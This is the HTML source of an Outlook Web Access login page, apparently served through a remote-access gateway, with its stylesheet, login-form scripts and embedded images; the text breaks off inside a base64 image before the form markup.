<HTML>
<HEAD>
<meta name="Robots" content="NOINDEX, NOFOLLOW">
<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache">
<META HTTP-EQUIV="Expires" CONTENT="-1">
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
<!-- in case client components are enabled, a header which indicates that IE10 needs to be opened in desktop mode is send back to client-->

<TITLE>Microsoft Exchange - Outlook Web Access</TITLE>
<style>
*,body,textarea{font-family:Tahoma,Arial,Helvetica}.bld,.nbMnuItm,.ur{font-weight:700}.bld,div.vlv .ur{font-weight:700}#divBrandBtns{font-size:100%}.fromSdr{font-size:120%}.readSubj{font-size:12pt;font-weight:700;font-family:Arial}.pvwFrom,.pvwMpFrom{font-size:130%;font-family:Arial}.fbBiu{font-family:Courier New;font-size:17px}table#tblPckr{font-size:0}.rwW a,.rwW em,.rwW strong,.rwW u{font-weight:400;font-style:normal}td#svRemTop{font-family:Arial;font-weight:700;font-size:130%}.dyTms{font-size:xx-small}.dpWN{font-size:7.5pt}.fb0{font-weight:400}.timeStripLeft{font-size:175%}#divDailyViewDateName,#divMonthlyViewDateName{font-weight:700;font-size:125%}.tdHdr{font-family:Arial;font-size:160%}div#divCmpFnt span span{font-weight:700;font-size:17px;font-family:Courier New}span.nm{font-size:130%;font-weight:700}.abArrw{font-family:Courier New}.mid{font-size:70%}.tdCopy{font-size:80%}input#txtcp{font-size:100%;font-family:Tahoma,Arial,Helvetica}.dyTmsAd .hrs td,.rcpLwr .tck td{width:36px}#tys td,.rcpHdrAd tr.t td{width:37px}.awRO,.awRW,.edtSubj,.edtTsk,.rwW,.timeStripRight,body.owaLgnBdy,button,div#divFH,div#divNFld,div#divRFld,div#divTr,input,input#txtFldN,input#txtNFld,label,pre,select,table,table#tblErr,td#tdErrHdCt,textarea,textarea#taAn{font-size:100%}button,input,pre,select{font-family:Tahoma,Arial,Helvetica}#spnMbQtUsg,.adMgHd,.bld,.bold,.cntDetPT,.cntSepT,.cntTabCT,.dyTms .dy,.fb1,.fbLbl,.lyt .hdr,.lyt .sugHdr,.moSctTxt,.nwItmTxtFrm,.pvwLabel,.pvwLblMdl,.rwDL,.ur,.visSbj,body.rtl .cntDetPT,div#divNtfyItmSb,span#spnPn,span.bld,table#tblCnts .bLn,table#tblCnts .sct,table#tblDpM td.b,td.pvwLblMdl,tr.gh td{font-weight:700}#divMN,#divSubj{font-family:Arial;font-size:12pt;font-weight:700}.fbItalics,.updNew,span#spnCmpI{font-style:italic}.rtl .wvsn,.wvsn{font:400 85% Tahoma,Sans Serif,Arial}.errDesc #errMsg,.errHd{font-size:130%}.dp,.dpDD{font-size:8pt}.cntNot,.mlIL span#abc,.txtBdy{font-family:Tahoma,Arial,Helvetica;font-size:100%}.btnOnFcs,.btnOnMseDwn,.btnOnMseOvr,.mbqtTxt,input.btn{font-size:95%}.tbEIB,.tbWIB{font:400 95% Tahoma,Sans Serif,Arial}#divMdNm{font-family:Arial Black,Gadget,sans-serif;font-size:17pt}body{background-color:#fff;text-align:center}img{border:0}.nonMSIE{padding:3px;margin:2px}table#tblMain{height:90%;margin-top:48px;padding:0}table.mid{width:385px;border-collapse:collapse;padding:0;color:#444}table.tblConn{direction:ltr}td.tdConnImg{width:22px}td.tdConn{padding-top:15px}td#mdLft{background:url(lgnleft2010.gif) repeat-y;width:15px}td#mdRt{background:url(lgnright2010.gif) repeat-y;width:15px}td#mdMid{padding:0 45px;background:#fff;vertical-align:top}td .txtpad{padding:3px 6px 3px 0}body.rtl td#mdMid{text-align:right;direction:rtl}select,table{color:#444}.txt,select{color:#000;background-color:#fff3c0;border:1px solid #a4a4a4;margin:3px 6px}.txt{padding:3px;height:2.2em}select.txt{width:320px}input.btn,input.button{font:Normal 11px tahoma;color:#fff;background-color:#eb9c12;border:0;padding:2px 6px;margin:0 6px;text-align:center}.btnOnFcs{color:#fff;background-color:#eb9c12;border:0;padding:2px 6px;margin:0 6px;text-align:center}.btnOnMseOvr{color:#fff;background-color:#f9b133;border:0;padding:2px 6px;margin:0 6px;text-align:center}.btnOnMseDwn{color:#000;background-color:#f9b133;border:0 solid #f9b133;padding:2px 6px;margin:0 6px;text-align:center}.nowrap{white-space:nowrap}hr{height:0;visibility:hidden}.l{text-align:left}.r,.rtl .l{text-align:right}.rtl .r{text-align:left}a{color:#ff6c00;text-decoration:none}.wrng{color:#ff6c00}.errorText,.errormsg{FONT-SIZE:11px;FONT-FAMILY:tahoma;PADDING-BOTTOM:14px;COLOR:#ff6c00;PADDING-TOP:14px}.internalTD{padding-left:62px;padding-right:50px}.nopadding TD{padding:0}.regText{FONT:12px tahoma;COLOR:#000;WIDTH:250px}.blueBold{FONT:bold 8pt tahoma}.content{vertical-align:top}.content TD{padding-bottom:0;padding-left:0;padding-right:0;font-size:70%}.componentswarningtext span{font:11px}.bottomText,.paramText{FONT:11px tahoma}.paramTextbox{color:#000;background-color:#fceeaf;border:1px solid #F6F8FF;margin:3px 0;padding:3px;height:2.2em;font-size:95%;width:200px}.paramTextboxReadonly{color:#000;BACKGROUND-COLOR:#d6d3ce;border:1px solid #a4a4a4;margin:0 6px;padding:3px;height:2.2em;font-size:95%;width:100%}.systemData{FONT-SIZE:11px;COLOR:#345;BORDER-BOTTOM:#b0b0b0 1px solid;FONT-FAMILY:tahoma}.systemHeader{FONT-SIZE:12px;COLOR:#3F52B8;FONT-FAMILY:tahoma}TD.systemTable{border:1px solid #a5a5a5;border-bottom:0;BACKGROUND-COLOR:#fff}.systemTable TD{PADDING:2px}.systemTableHeader{background-image:url(../images/grid_header.gif);background-repeat:repeat-x;FONT-SIZE:11pt;FONT-WEIGHT:bold;COLOR:#383838;FONT-FAMILY:arial}.systemTableHeader TD{BORDER-BOTTOM:#a5a5a5 1px solid}TD.systemTable2{border:1px solid #cbcfd4;BACKGROUND-COLOR:#e0e3e7 border-top:1px solid #fafafa}.systemTable2 TD{border-top:0;border-bottom:0}.systemTable2AltBgr{BACKGROUND-COLOR:#e7eaee}.systemTable2AltBgr TD{border-top:1px solid #fafafa;border-bottom:1px solid #fafafa}.systemTable2 TD{PADDING:2px;PADDING-LEFT:10px}.systemLabel{FONT-SIZE:11px;COLOR:#333;BORDER-BOTTOM:#b0b0b0 1px solid;FONT-FAMILY:tahoma;vertical-align:top}.systemWarning{FONT-SIZE:9pt;COLOR:#f49821}.systemWarningBold{FONT-SIZE:9pt;COLOR:#f49821;font-weight:700}.systemMessageBold{FONT-SIZE:9pt;COLOR:#72d97f;FONT-WEIGHT:bold}.copyright{PADDING-RIGHT:5px;PADDING-LEFT:5px;FONT-SIZE:10px;PADDING-BOTTOM:2px;PADDING-TOP:2px;FONT-FAMILY:tahoma}.disBsc,.expl{color:#999}.txt,.w100{width:100%}.txt{margin:0 6px}.rdo{margin:0 12px 0 32px}body.rtl .rdo{margin:0 32px 0 12px}tr.expl td,tr.wrng td{padding:2px 0 4px}tr#trSec td{padding:3px 0 8px}td#tdLng{padding:12px 0}td#tdTz{padding:8px 0}select#selTz{padding:0;margin:0}td#tdOptMsg{padding:10px 0}td#tdOptChk{padding:0 0 15px 65px}td#tdOptAcc{vertical-align:middle;padding:0 0 0 3px}select#selLng{margin:0 16px}input#btnOk{width:50px}td#tdMsg{margin:9px 0 64px}input#btnCls{margin:3px 6px}div#dvErr{padding:0 0 3px 3px;background-color:#FCBC9C;border:1px solid #B43038}div#dvErr table{color:#000}div#dvErr a{color:#3F52B8}td.lgnBL,td.lgnTL{width:456px}td.lgnTM{background:url(lgntopm.gif) repeat-x;width:100%}td.lgnBM{background:url(lgnbotm.gif) repeat-x;width:100%}td.lgnBR,td.lgnTR{width:45px}table.tblLgn{padding:0;margin:0;border-collapse:collapse;width:100%}.blueBorder{WIDTH:680px;HEIGHT:420px;BACKGROUND:url(data:image/gif;base64,R0lGODlhqAIBAHAAACH5BAEAAPwALAAAAACoAgEAhwAAAAAAMwAAZgAAmQAAzAAA/wArAAArMwArZgArmQArzAAr/wBVAABVMwBVZgBVmQBVzABV/wCAAACAMwCAZgCAmQCAzACA/wCqAACqMwCqZgCqmQCqzACq/wDVAADVMwDVZgDVmQDVzADV/wD/AAD/MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMrADMrMzMrZjMrmTMrzDMr/zNVADNVMzNVZjNVmTNVzDNV/zOAADOAMzOAZjOAmTOAzDOA/zOqADOqMzOqZjOqmTOqzDOq/zPVADPVMzPVZjPVmTPVzDPV/zP/ADP/MzP/ZjP/mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YrAGYrM2YrZmYrmWYrzGYr/2ZVAGZVM2ZVZmZVmWZVzGZV/2aAAGaAM2aAZmaAmWaAzGaA/2aqAGaqM2aqZmaqmWaqzGaq/2bVAGbVM2bVZmbVmWbVzGbV/2b/AGb/M2b/Zmb/mWb/zGb//5kAAJkAM5kAZpkAmZkAzJkA/5krAJkrM5krZpkrmZkrzJkr/5lVAJlVM5lVZplVmZlVzJlV/5mAAJmAM5mAZpmAmZmAzJmA/5mqAJmqM5mqZpmqmZmqzJmq/5nVAJnVM5nVZpnVmZnVzJnV/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwAM8wAZswAmcwAzMwA/8wrAMwrM8wrZswrmcwrzMwr/8xVAMxVM8xVZsxVmcxVzMxV/8yAAMyAM8yAZsyAmcyAzMyA/8yqAMyqM8yqZsyqmcyqzMyq/8zVAMzVM8zVZszVmczVzMzV/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8Amf8AzP8A//8rAP8rM/8rZv8rmf8rzP8r//9VAP9VM/9VZv9Vmf9VzP9V//+AAP+AM/+AZv+Amf+AzP+A//+qAP+qM/+qZv+qmf+qzP+q///VAP/VM//VZv/Vmf/VzP/V////AP//M///Zv//mf//zP///wAAAAAAAAAAAAAAAAgwAPcJHCgwE8GDCBMqXMiwocOHECNKnEixosWLGDNq3Mixo8ePIEOKHEmypMmCCgMCADs=) repeat-y}table#appletTable{BACKGROUND:#fff}.progressBarFrame{border:2px solid #C8D3E3;font-size:2px;width:208;height:28}.progressBarLeft{background-color:#C8D3E3;border-left:2px solid #fff;border-top:2px solid #fff;border-bottom:2px solid #fff;width:0}.progressBarRight{background-color:#fff;border-left:2px solid #fff;border-top:2px solid #fff;border-bottom:2px solid #fff;width:200px}
</style>

<script language="JavaScript">
var loginDone = false;

var timeoutURL = "";
var bHandleSessionTimeout = false;

	
	try
	{
		if (parent.parent.document.getElementById("portal_frameset"))
			parent.location.replace("/uniquesigbb3eff400816d920c3937d65e0904dd5/uniquesig0/InternalSite/OWA/LogoffMsg.asp?site_name=exchange&secure=1");
	}
	catch(e)
	{}
	
	bHandleSessionTimeout = true;
	timeoutURL = "/InternalSite/InternalError.asp" + "?error_code=117";


//for old browsers. To support document.getElementById
if(document.all && !document.getElementById) 
{    
	document.getElementById = function(id) 
	{
		return document.all[id];
	}
}

function SubmitForm()
{	
	if (loginDone)
		return false;
	for (i = 0 ; i < document.form1.length ; i++)
	{ 
		var tempobj = document.form1.elements[i];

		if((tempobj.id == 'user_name' && tempobj.value.length < 1) || (tempobj.type == 'password' && tempobj.value.length < 8)){
			document.getElementById('trInvCrd').style.display = 'block';
			SetFocus();
			return false;
		}
	}

	loginDone = true;
	
	clkLgn();
	
	return true;
}

function ResetForm()
{	
	document.form1.reset();
	SetFocus();
	return false;
}

function SetFocus()
{
	for (var i = 0 ; i < document.form1.elements.length ; i++)
	{
	    if ((document.form1.elements[i].type == "text" || document.form1.elements[i].type == "password") && document.form1.elements[i].value.toString() == "")
	    {
	        document.form1.elements[i].focus();
	        break;
	    }
	}
}

function selectLang()
{    
	var today = new Date();
	var expiredDate = new Date(today.getTime() + 365 * 24 * 60 * 60 * 1000); // +1 year
	var expiredDateGMT = expiredDate.toGMTString();
	document.cookie = "WhlLanguage=" + document.form1.language.value + "; expires=" + expiredDateGMT + ";path=/";
	SetClientComponentsUILanguage(document.form1.language.value);
	// We need to reload the login page here, but only if the user hasn't already entered a username and/or password.
	var confirmChangeLang = true;
	for (i = 0 ; i < document.form1.length ; i++)
	{ 
		var tempobj=document.form1.elements[i];
		if (tempobj.type=='text' || tempobj.type=='password')
		{
			if (tempobj.value.toString() != "")
			{
				confirmChangeLang = confirm("Do you want to reload the page in the selected language?\nAll data entered on the page will be deleted.");
				break;
			}
		}
	}  	
	if (confirmChangeLang)
		self.location.replace("/uniquesigbb3eff400816d920c3937d65e0904dd5/uniquesig0/InternalSite/RedirectToOrigURL.asp?abandon=0&site_name=exchange&secure=1");
}

// needed on flogon.js
var isSessionPrivileged = "FALSE";
var isInstallationEnabled = "0";

// Taken from Logon.aspx
// a_fRC should be set according to ReplaceCurrent value
//
var a_fRC = 1;
// The variable g_fFcs is set to false when the password gains focus,
// so that we don't accidentally set focus to the username field while
// the user is typing their password
//
var g_fFcs = 1;

/// <summary>
/// Is Mime Control installed?
/// </summary>
function IsMimeCtlInst(progid)
{
	var oMimeVer = null;

	try 
	{ 
		oMimeVer = new ActiveXObject(progid);
	} 
	catch (e)
	{ 
	}

	if (oMimeVer != null)
		return true;
	else
		return false;
}

/// <summary>
/// Render out the S-MIME control if it is installed.
/// </summary>
function RndMimeCtl()
{
	if (IsMimeCtlInst("MimeBhvr.MimeCtlVer"))
		RndMimeCtlHlpr("MimeNSe2k3", "D801B381-B81D-47a7-8EC4-EFC111666AC0", "MIMEe2k3", "mimeLogoffE2k3");

	if (IsMimeCtlInst("OwaSMime.MimeCtlVer"))
		RndMimeCtlHlpr("MimeNSe2k7sp1", "833aa5fb-7aca-4708-9d7b-c982bf57469a", "MIMEe2k7sp1", "mimeLogoffE2k7sp1");

	if (IsMimeCtlInst("OwaSMime2.MimeCtlVer"))
		RndMimeCtlHlpr("MimeNSe2k9", "4F40839A-C1E5-47E3-804D-A2A17F42DA21", "MIMEe2k9", "mimeLogoffE2k9");
}

/// <summary>
/// Helper function to factor out the rendering of the S/MIME control.
/// </summary>
function RndMimeCtlHlpr(objid, classid, ns, id)
{
	document.write("<OBJECT id='" + objid + "' classid='CLSID:" + classid + "'></OBJECT>");
	document.write("<" + ns + ":Logoff id='" + id + "' style='display:none'/>");
}
	
</script>
<script language="JavaScript">
function initLogon(){try{LogoffMime()}catch(e){}if(isSessionPrivileged!="TRUE"&&isInstallationEnabled!=0){if(g_fFcs)gbid("user_name").focus()}else{var t=/(^|; )logondata=acc=([0|1])&lgn=([^;]+)(;|$)/;var n=t.exec(document.cookie);if(n){gbid("user_name").value=n[3];gbid("password").focus();gbid("rdoPrvt").click();if(n[2]=="1")gbid("chkBsc").click()}else{if(g_fFcs){try{gbid("username").focus()}catch(e){}}}}if(IsIE6()&&!IsWin98())gbid("chkBsc").disabled=false;var r="cookieTest";var i=new Date;i.setSeconds(i.getSeconds()+2);document.cookie=r+"=1; expires="+i.toGMTString();var s=document.cookie.indexOf(r+"=")!=-1;if(s==false){shw(gbid("tblMid2"));hd(gbid("tblMid"))}}function redir(){var e=window;try{if(e.dialogArguments){var t=new String(Math.round(Math.random()*1e5));var n="toolbar=0,location=0,directories=0,status=1,menubar=0,scrollbars=1,resizable=1,width=800,height=600";var r=Math.round((screen.availHeight-600)/2);var i=Math.round((screen.availWidth-800)/2);n+=",top="+r+",left="+i;var s=e.dialogArguments.opener;try{if(s)s.open(unescape(a_sCW),t,n)}catch(o){}e.close();return}}catch(o){}var u=a_sUrl;while(1){try{var a=e.frameElement.document.parentWindow;if(!a.g_fOwa)break;e=a;u=""}catch(o){break}}try{var f=e.opener;if(f){var l=Math.round((screen.availWidth-800)/2);var c=Math.round((screen.availHeight-600)/2);e.moveTo(l,c);e.resizeTo(800,600);u="&url="+a_sCW}}catch(o){}e.location.href=a_sLgn+u}function shw(e){e.style.display=""}function hd(e){e.style.display="none"}function clkExp(e){var t=gbid(e);if(t.tagName=="IMG")t=t.parentElement;switch(t){case gbid("lnkShwSec"):hd(gbid("lnkShwSec"));shw(gbid("lnkHdSec"));if(gbid("trPubExp"))shw(gbid("trPubExp"));if(gbid("trPrvtExp"))shw(gbid("trPrvtExp"));gbid("lnkHdSec").focus();break;case gbid("lnkHdSec"):shw(gbid("lnkShwSec"));hd(gbid("lnkHdSec"));if(gbid("trPubExp"))hd(gbid("trPubExp"));if(gbid("trPrvtExp"))hd(gbid("trPrvtExp"));gbid("lnkShwSec").focus();break}}function clkSec(){var e=gbid("rdoPrvt").checked;gbid("trPrvtWrn").style.display=e?"":"none";if(e){document.form1["flags"].value|=4}else{document.form1["flags"].value&=~4;var t=new Date;t.setTime(t.getTime()-9999);document.cookie="logondata=; expires="+t.toUTCString()}}function clkBsc(){var e=gbid("chkBsc").checked;gbid("trBscExp").style.display=e?"":"none";if(e)document.form1.flags.value|=1;else document.form1.flags.value&=~1}function clkLgn(){if(isSessionPrivileged=="TRUE"||isInstallationEnabled==0){try{if(gbid("rdoPrvt").checked){var e=new Date;e.setTime(e.getTime()+2*7*24*60*60*1e3);var t="acc="+(gbid("chkBsc").checked?1:0);var n="lgn="+gbid("user_name").value;document.cookie="logondata="+t+"&"+n+"; expires="+e.toUTCString()}}catch(r){}}}function clkRtry(){window.location.reload()}function clkReLgn(){window.location.href="../"}function gbid(e){return document.getElementById(e)}function IsIE6(){var e=5;var t=navigator.appVersion.indexOf("MSIE ");if(t!=-1&&typeof window.external=="object"){var n=parseInt(navigator.appVersion.substring(t+5,t+6),10);if(!isNaN(n))e=n;if(e>=6){return true}}return false}function IsWin98(){return navigator.appVersion.indexOf("Windows 98")!=-1&&navigator.appVersion.indexOf("Windows 98; Win 9x 4.90")==-1}function hres(e){return e+4294967295+1}function LogoffMime(){try{if(typeof mimeLogoffE2k3!="undefined"&&null!=mimeLogoffE2k3&&IsMimeCtlInst("MimeBhvr.MimeCtlVer"))mimeLogoffE2k3.Logoff();if(typeof mimeLogoffE2k7SP1!="undefined"&&null!=mimeLogoffE2k7SP1&&IsMimeCtlInst("OwaSMime.MimeCtlVer"))mimeLogoffE2k7SP1.Logoff();if(typeof mimeLogoffE2k9!="undefined"&&null!=mimeLogoffE2k9&&IsMimeCtlInst("OwaSMime2.MimeCtlVer"))mimeLogoffE2k9.Logoff()}catch(e){}}
</script>
</HEAD>
<BODY height="100%" style="overflow:hidden;">

<table id="tblMain" width="100%" cellspacing="0" cellpadding="0">
	<tr>
		<td>
			<TABLE align="center" class="blueBorder" cellspacing="0" cellpadding="0">	
				<tr height="115">
	<td id="companyTD" width="100%" colspan="3">
		<table width="100%" cellpadding="0" cellspacing="0">
			<tr>
				<td width="456px">
					<img src="data:image/gif;base64,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